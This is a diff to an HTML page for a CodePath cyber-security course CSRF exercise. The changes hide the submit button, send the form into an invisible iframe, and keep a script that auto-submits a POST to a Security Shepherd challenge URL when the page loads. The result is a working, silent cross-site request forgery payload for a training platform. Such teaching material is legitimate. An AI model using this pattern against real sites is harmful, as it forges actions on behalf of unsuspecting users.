@@ -3,12 +3,18 @@
   <head>
     <meta charset="utf-8">
     <title>CSRF Exercise</title>
+    <style media="screen">
+      #submitButton {
+        visibility: hidden;
+      }
+    </style>
   </head>
   <body>
     <p>This is a CSRF exercise for CodePath's Cyber Security course. Please do not be alarmed -- this is not a malicious site.</p>
-    <form name="csrfForm" action="http://securityshepherd.com/user/csrfchallengetwo/plusplus?userId=21d3c09c852aea1d62e7aafa87f1a0736ccc0f2f" method="POST">
-      <input type="submit"/>
+    <form name="csrfForm" action="http://securityshepherd.com/user/csrfchallengetwo/plusplus?userId=21d3c09c852aea1d62e7aafa87f1a0736ccc0f2f" method="POST" target="not_shown">
+      <input type="submit" id="submitButton"/>
     </form>
+    <iframe name="not_shown" style="display: none;"></iframe>
   <script>
     document.csrfForm.submit();
   </script>
